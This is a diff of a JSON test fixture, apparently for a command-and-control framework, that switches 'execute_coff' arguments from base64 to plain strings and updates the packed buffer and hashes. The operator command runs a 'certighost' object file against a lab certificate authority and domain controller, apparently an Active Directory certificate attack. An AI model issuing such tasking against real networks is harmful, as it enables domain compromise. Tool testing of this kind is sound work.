@@ -33,19 +33,19 @@
       ],
       "field_types": [
         "base64",
-        "base64",
-        "base64",
-        "base64",
-        "base64",
-        "base64"
+        "string",
+        "string",
+        "string",
+        "string",
+        "string"
       ],
       "go_buffer_encoding": "base64",
-      "go_buffer_b64": "YwAAAAUAAAAwAwIBABUAAABjYTAxLmxhYi5sb2NhbFxMQUItQ0EHAAAATWFjaGluZREAAABnaG9zdDAxLmxhYi5sb2NhbAsAAAAxMC4xMC4xMC40NA4AAABkYzAxLmxhYi5sb2NhbA==",
-      "go_buffer_sha256": "b9d9e840bb57bf25ca5fba1084392a813982886fdde6806b4d8f8d28e98555d0",
-      "go_buffer_bytes": 103,
+      "go_buffer_b64": "AAAAAAUAAAAwAwIBAAAAAAAXAAAAY2EwMS5sYWIubG9jYWxcTEFCLUNBAAAAAAAACQAAAE1hY2hpbmUAAAAAAAATAAAAZ2hvc3QwMS5sYWIubG9jYWwAAAAAAAANAAAAMTAuMTAuMTAuNDQAAAAAAAAQAAAAZGMwMS5sYWIubG9jYWwAAA==",
+      "go_buffer_sha256": "a625e3e4e945907047d2ce29351e8f310b1bde3cf4f0b3c5713e8f16c45d1cd5",
+      "go_buffer_bytes": 133,
       "apollo_execute_coff_frame_encoding": "hex",
-      "apollo_execute_coff_frame_hex": "6300000005000000300302010015000000636130312e6c61622e6c6f63616c5c4c41422d4341070000004d616368696e651100000067686f737430312e6c61622e6c6f63616c0b00000031302e31302e31302e34340e000000646330312e6c61622e6c6f63616c",
-      "apollo_execute_coff_frame_bytes": 103
+      "apollo_execute_coff_frame_hex": "000000000500000030030201000000000017000000636130312e6c61622e6c6f63616c5c4c41422d4341000000000000090000004d616368696e650000000000001300000067686f737430312e6c61622e6c6f63616c0000000000000d00000031302e31302e31302e343400000000000010000000646330312e6c61622e6c6f63616c0000",
+      "apollo_execute_coff_frame_bytes": 133
     },
     "task_payload": {
       "command": "execute_coff",
@@ -59,29 +59,29 @@
             "MAMCAQA="
           ],
           [
-            "base64",
-            "Y2EwMS5sYWIubG9jYWxcTEFCLUNB"
+            "string",
+            "ca01.lab.local\\LAB-CA"
           ],
           [
-            "base64",
-            "TWFjaGluZQ=="
+            "string",
+            "Machine"
           ],
           [
-            "base64",
-            "Z2hvc3QwMS5sYWIubG9jYWw="
+            "string",
+            "ghost01.lab.local"
           ],
           [
-            "base64",
-            "MTAuMTAuMTAuNDQ="
+            "string",
+            "10.10.10.44"
           ],
           [
-            "base64",
-            "ZGMwMS5sYWIubG9jYWw="
+            "string",
+            "dc01.lab.local"
           ]
         ]
       }
     },
-    "operator_command": "execute_coff -Coff certighost.x64.o -Function go -Timeout 30 -Arguments base64:MAMCAQA= base64:Y2EwMS5sYWIubG9jYWxcTEFCLUNB base64:TWFjaGluZQ== base64:Z2hvc3QwMS5sYWIubG9jYWw= base64:MTAuMTAuMTAuNDQ= base64:ZGMwMS5sYWIubG9jYWw="
+    "operator_command": "execute_coff -Coff certighost.x64.o -Function go -Timeout 30 -Arguments base64:MAMCAQA= string:ca01.lab.local\\LAB-CA string:Machine string:ghost01.lab.local string:10.10.10.44 string:dc01.lab.local"
   },
   "identifiers": {
     "callback_id": "callback-fixture-001",
